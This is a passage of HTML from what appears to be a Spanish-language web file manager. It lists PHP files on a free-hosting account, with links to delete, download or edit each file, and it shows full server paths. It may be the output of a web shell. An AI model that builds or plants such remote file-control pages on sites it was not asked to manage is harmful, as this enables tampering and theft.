                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">password-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">password.php</a></td>
                    <td>Archivo</td>
                    <td>2.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">perfil.php</a></td>
                    <td>Archivo</td>
                    <td>43.44 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">playlist.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">post.borrar.php</a></td>
                    <td>Archivo</td>
                    <td>630 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">post.php</a></td>
                    <td>Archivo</td>
                    <td>69 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">posts.php</a></td>
                    <td>Archivo</td>
                    <td>2.84 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">ppdias.php</a></td>
                    <td>Archivo</td>
                    <td>1.07 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">prev.php</a></td>
                    <td>Archivo</td>
                    <td>439 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">preview.php</a></td>
                    <td>Archivo</td>
                    <td>3.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">privacidad-de-datos.php</a></td>
                    <td>Archivo</td>
                    <td>7.99 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">protocolo.php</a></td>
                    <td>Archivo</td>
                    <td>11.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">recaptcha.php</a></td>
                    <td>Archivo</td>
                    <td>1.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">recomendar-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">recomendar.php</a></td>
                    <td>Archivo</td>
                    <td>1.14 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">registro-check-email.php</a></td>
                    <td>Archivo</td>
                    <td>214 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">registro-check-nick.php</a></td>
                    <td>Archivo</td>
                    <td>232 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">registro-confirmar.php</a></td>
                    <td>Archivo</td>
                    <td>698 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">registro-form.php</a></td>
                    <td>Archivo</td>
                    <td>24.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">registro-geo.php</a></td>
                    <td>Archivo</td>
                    <td>1.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">registro-notificacion.php</a></td>
                    <td>Archivo</td>
                    <td>303 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">registro2.php</a></td>
                    <td>Archivo</td>
                    <td>4.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">registrooff.php</a></td>
                    <td>Archivo</td>
                    <td>21.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">salir.php</a></td>
                    <td>Archivo</td>
                    <td>299 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">session.php</a></td>
                    <td>Archivo</td>
                    <td>1.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">staff.php</a></td>
                    <td>Archivo</td>
                    <td>4.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">tagcloud.php</a></td>
                    <td>Archivo</td>
                    <td>10.53 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">tagss.php</a></td>
                    <td>Archivo</td>
                    <td>50.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">terminos-y-condiciones.php</a></td>
                    <td>Archivo</td>
                    <td>34.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">top.php</a></td>
                    <td>Archivo</td>
                    <td>32.88 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">trabajo.php</a></td>
                    <td>Archivo</td>
                    <td>3.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
